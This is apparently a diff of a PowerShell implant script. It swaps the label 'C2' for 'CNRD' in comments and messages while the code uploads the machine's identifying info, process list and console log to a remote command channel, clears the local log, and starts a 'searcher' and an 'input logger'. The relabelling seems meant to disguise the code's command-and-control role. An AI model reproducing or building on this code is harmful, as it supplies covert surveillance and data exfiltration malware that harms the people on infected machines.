@@ -1,4 +1,4 @@
-#Use this function to upload to C2 in the package format so the comments can be easily parsed later
+#Use this function to upload to CNRD in the package format so the comments can be easily parsed later
 function Send-PackageMessage
 {
 	[CmdletBinding()] Param
@@ -167,7 +167,7 @@ catch
 	Exit
 }
 
-#Use Get-ComputerInfo to get the allegedly unique ProductID which is used to identify the specific machine during communications with C2.
+#Use Get-ComputerInfo to get the allegedly unique ProductID which is used to identify the specific machine during communications with CNRD.
 $compInfo = Get-ComputerInfo
 #Write-Host "DEBUG: Finished getting computer info."
 
@@ -235,29 +235,29 @@ Else
 	catch
 	{
 		Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to create the logs folder. Error: " + $Error)
-		#Write-Host "DEBUG: Exception thrown trying to create the logs folder. Notified C2. Exiting."; Start-Sleep -s 600
+		#Write-Host "DEBUG: Exception thrown trying to create the logs folder. Notified CNRD. Exiting."; Start-Sleep -s 600
 		Exit
 	}
 	if (-not ($logFolderPath | Test-Path))
 	{
 		Send-PackageMessage -Package "EXCEPTION" -IssueNumber $issueNumber -Body ("No exceptions thrown, but unable to locate the logs folder. Exiting.")
-		#Write-Host "DEBUG: Unable to locate the logs folder despite no exceptions being thrown. Notified C2. Exiting."; Start-Sleep -s 600
+		#Write-Host "DEBUG: Unable to locate the logs folder despite no exceptions being thrown. Notified CNRD. Exiting."; Start-Sleep -s 600
 		Exit
 	}
 }
 
 #Write startup confirmation to console log
 Write-Console -Body "Startup OK!" -IssueNumber $issueNumber
-Write-Console -Body "Uploading log to C2..." -IssueNumber $issueNumber
+Write-Console -Body "Uploading log to CNRD..." -IssueNumber $issueNumber
 
-#Upload the console log to C2, then clear it.
+#Upload the console log to CNRD, then clear it.
 try 
 {
 	$consoleLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\console.log"
 	If([System.IO.File]::Exists($consoleLogPath))
 	{
 		Send-PackageMessage -Package "CONSOLE" -IssueNumber $issueNumber -Body (Get-Content -Path $consoleLogPath -Raw)
-		#Write-Host "DEBUG: Uploaded the console log to C2. Clearing it..."
+		#Write-Host "DEBUG: Uploaded the console log to CNRD. Clearing it..."
 		Clear-Content -Path $consoleLogPath
 		Write-Console -Body "Uploaded the console log and cleared it." -IssueNumber $issueNumber
 		#Write-Host "DEBUG: Cleared the old console log."
@@ -273,8 +273,8 @@ try
 catch 
 {
 	Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload the console log file. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to upload the console log file. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to upload the console log file. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to upload the console log file. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to upload the console log file. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
@@ -282,14 +282,14 @@ catch
 try
 {
     Send-PackageMessage -Package "COMPINFO" -IssueNumber $issueNumber -Body ($compInfo | Out-String)
-    Write-Console -Body "Uploaded the computer info to C2." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Uploaded the computer info to C2."
+    Write-Console -Body "Uploaded the computer info to CNRD." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Uploaded the computer info to CNRD."
 }
 catch
 {
     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload the computer info. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to upload the computer info. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to upload the computer info. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to upload the computer info. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to upload the computer info. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
@@ -297,14 +297,14 @@ catch
 try
 {
     Send-PackageMessage -Package "PROCINFO" -IssueNumber $issueNumber -Body ($procInfo | Out-String)
-    Write-Console -Body "Uploaded the process info to C2." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Uploaded the process info to C2."
+    Write-Console -Body "Uploaded the process info to CNRD." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Uploaded the process info to CNRD."
 }
 catch
 {
     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload the process info. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to upload the process info. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to upload the process info. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to upload the process info. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to upload the process info. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
@@ -319,8 +319,8 @@ try
 catch
 {
 	Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to start the searcher. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to start the searcher. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to start the searcher. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to start the searcher. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to start the searcher. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
@@ -335,7 +335,7 @@ try
 catch
 {
 	Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to start the input logger. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to start the input logger. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to start the input logger. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to start the input logger. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to start the input logger. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
